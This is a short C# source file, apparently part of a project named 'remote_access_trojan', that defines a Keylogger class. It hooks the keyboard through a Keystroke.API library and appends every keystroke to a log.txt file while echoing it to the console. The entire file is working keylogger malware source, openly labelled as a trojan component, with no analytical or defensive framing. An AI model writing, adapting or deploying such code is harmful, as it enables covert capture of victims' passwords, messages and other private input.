using System;
using System.Windows.Forms;
using System.IO;
using Keystroke.API;

namespace remote_access_trojan
{
    class Keylogger
    {
        // Calling this method will log all keyboard presses until the program has exited
        public static void Run()
        {
            var api = new KeystrokeAPI();
            api.CreateKeyboardHook((character) => {
                string output = character.ToString();
                if (character.KeyCode == KeyCode.Enter)
                    output += "\n";

                Console.Write(output);
                File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), "log.txt"), output);
            });
        }
    }
}
